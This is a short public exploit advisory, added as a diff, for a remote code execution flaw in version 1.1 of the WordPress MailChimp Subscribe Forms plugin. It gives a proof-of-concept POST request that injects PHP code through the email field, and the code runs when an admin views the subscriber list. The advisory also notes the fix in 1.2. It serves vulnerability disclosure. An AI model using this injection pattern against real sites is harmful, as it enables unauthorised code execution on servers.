@@ -1,0 +1,26 @@
+# Exploit Title: Wordpress MailChimp Subscribe Forms Remote Code Execution
+# Date: 21-04-2015
+# Exploit Author: woodspeed
+# Vendor Homepage: https://wordpress.org/plugins/mailchimp-subscribe-sm/
+# Software Link: https://downloads.wordpress.org/plugin/mailchimp-subscribe-sm.1.1.zip
+# Version: 1.1
+# Tested on: Apache 2.2.22, PHP 5.3.10
+# OSVDB ID : http://www.osvdb.org/show/osvdb/121081
+# WPVULNDB ID : https://wpvulndb.com/vulnerabilities/7935
+# Category: webapps
+
+1. Description
+
+Remote Code Execution via email field.
+
+2. Proof of Concept
+
+POST Request
+
+sm_email=<?php echo 'Current PHP version: '. phpversion();?>&submit=
+
+When the admin user checks the subscibers list, the php code is executed.
+
+3. Solution
+
+Fixed in version 1.2
